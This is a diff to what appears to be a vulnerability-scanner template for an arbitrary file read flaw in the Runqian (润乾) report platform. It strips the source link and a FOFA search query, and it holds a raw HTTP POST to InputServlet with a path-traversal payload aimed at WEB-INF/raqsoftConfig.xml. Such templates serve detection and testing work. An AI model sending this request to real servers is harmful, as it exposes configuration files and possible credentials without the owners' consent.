@@ -3,12 +3,8 @@ info:
   name: 润乾报表平台 InputServlet 任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/otdbv8y0k6z2kn41'
+  description: ''
   tags: lfi,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: otdbv8y0k6z2kn41
-    fofa: body="润乾报表"
 http:
 - raw:
   - 'POST /InputServlet?action=13 HTTP/1.1
@@ -18,8 +14,6 @@ http:
 
 
     Connection: close
-
-
 
 
     file=%2F%5C..%5C%5C..%5C%5CWEB-INF%5C%5CraqsoftConfig.xml&upFileName=web.config
